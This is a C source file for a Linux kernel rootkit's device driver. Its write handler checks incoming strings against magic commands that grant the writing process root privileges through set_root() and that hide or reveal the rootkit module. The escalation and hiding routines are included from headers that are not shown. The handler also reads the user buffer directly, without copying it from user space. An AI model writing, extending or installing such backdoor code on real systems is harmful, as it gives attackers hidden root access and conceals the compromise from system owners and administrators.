#include "../include/debug.h"

#include "include/driver.h"

#include "include/hide.h"
#include "include/privesc.h"

int rk_driver_open(struct inode *i, struct file *f)
{
    RKT_DEBUG("Device File Opened...!!!\n");
    return 0;
}

int rk_driver_release(struct inode *i, struct file *f)
{
    RKT_DEBUG("Device File Closed...!!!\n");
    return 0;
}

ssize_t rk_driver_read(struct file *file, char __user *buf, size_t count, loff_t *off)
{
    RKT_DEBUG("Device have been read...!!!\n");
    return 0;
}

ssize_t rk_driver_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
{
    RKT_DEBUG("Got payload : %s", buf);

    if (strcmp(buf, RK_PRIVESC) == 0)
    {
        RKT_DEBUG("Blud wanted to get root\n");
        int ret;

        ret = set_root();
        if (ret < 0)
        {
            RKT_DEBUG("Privesc failed with error: %d\n", ret);
            return ret;
        }
        else
        {
            RKT_DEBUG("Should have got root\n");
        }
    }

    else if (strcmp(buf, RK_HIDE) == 0)
    {
        int ret;
        RKT_DEBUG("Hiding the rootkit\n");

        ret = hide();
        if (ret < 0)
        {
            RKT_DEBUG("Rootkit already hidden.\n");
            return ret;
        }
        else
        {
            RKT_DEBUG("Should have hidden the rootkit\n");
        }
    }

    else if (strcmp(buf, RK_REVEAL) == 0)
    {
        int ret;
        RKT_DEBUG("Revealing the rootkit\n");

        ret = unhide();
        if (ret < 0)
        {
            RKT_DEBUG("Rootkit already shown.\n");
            return ret;
        }
        else
        {
            RKT_DEBUG("Should have revealed the rootkit\n");
        }
    }

    return len;
}

long rk_driver_ioctl(struct file *file, unsigned int request, unsigned long arg)
{
    RKT_DEBUG("Device have been ioctl'ed...!!!\n");
    return 0;
}